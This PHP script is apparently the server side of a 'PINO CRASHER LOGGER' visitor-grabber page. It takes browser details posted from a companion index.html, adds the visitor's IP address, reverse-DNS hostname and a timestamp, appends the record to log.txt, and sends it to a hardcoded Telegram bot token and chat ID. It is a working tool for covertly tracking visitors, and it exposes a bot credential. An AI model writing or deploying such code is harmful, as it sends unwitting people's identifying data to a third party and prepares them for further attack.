<?php
date_default_timezone_set('Asia/Kuala_Lumpur');

// Telegram Bot Info
$botToken = "7576364114:AAG-lbhMq0MhC6yBh5PvukJasa2pTnDs_OA";
$chatId   = "7674223875";

// Read JSON from index.html
$data = json_decode(file_get_contents("php://input"), true);
$ip     = $_SERVER['REMOTE_ADDR'];
$host   = gethostbyaddr($ip);
$time   = date("Y-m-d H:i:s");
$uid    = strtoupper(bin2hex(random_bytes(4)));

// Format log
$log = <<<EOL
╔══════════════════════════════════════════════════════╗
║      ⚠️  INCOMING CONNECTION LOG [$time]              ║
╠══════════════════════════════════════════════════════╣
║ UID            : $uid
║ IP Address     : $ip
║ Hostname       : $host
║ User Agent     : {$data['userAgent']}
║ Screen Size    : {$data['screen']}
║ Language       : {$data['language']}
║ Platform       : {$data['platform']}
╚══════════════════════════════════════════════════════╝

EOL;

// Simpan ke log.txt
file_put_contents("log.txt", $log, FILE_APPEND);

// antar ke Telegram
$msg = <<<MSG
⚠️ *PINO CRASHER LOGGER*
\`\`\`
UID       : $uid
IP        : $ip
Host      : $host
Time      : $time
Platform  : {$data['platform']}
Language  : {$data['language']}
Screen    : {$data['screen']}
Agent     : {$data['userAgent']}
\`\`\`
MSG;

file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
    "chat_id" => $chatId,
    "text"    => $msg,
    "parse_mode" => "Markdown"
]));
?>
